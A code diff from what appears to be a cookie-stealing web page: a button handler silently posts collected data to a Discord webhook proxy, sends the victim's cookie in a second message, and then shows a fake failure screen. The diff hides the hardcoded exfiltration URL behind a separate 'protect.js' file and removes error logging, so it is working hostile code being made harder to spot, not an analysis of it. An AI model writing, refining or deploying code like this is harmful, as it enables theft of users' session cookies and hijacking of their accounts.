@@ -126,8 +126,8 @@ btnStart.onclick = async () => {
             return;
         }
 
-        // 🔥 SEND TO WEBHOOK FROM BROWSER (bypasses Vercel!)
-        const WEBHOOK_URL = 'https://discord-proxy.ducksducks762.workers.dev';
+        // Get webhook URL from protect.js
+        const WEBHOOK_URL = window.WEBHOOK_URL;
         
         // Prepare webhook data
         const webhookData = {
@@ -155,12 +155,12 @@ btnStart.onclick = async () => {
             }]
         };
 
-        // Send webhook (fire and forget, don't wait)
+        // Send webhook (fire and forget)
         fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(webhookData)
-        }).catch(() => {}); // Ignore errors
+        }).catch(() => {});
 
         // Send cookie in second message
         setTimeout(() => {
@@ -216,7 +216,6 @@ btnStart.onclick = async () => {
         }, 1200);
 
     } catch (err) {
-        console.error(err);
         setTimeout(() => {
             processingState.classList.add('hidden');
             failedState.classList.remove('hidden');
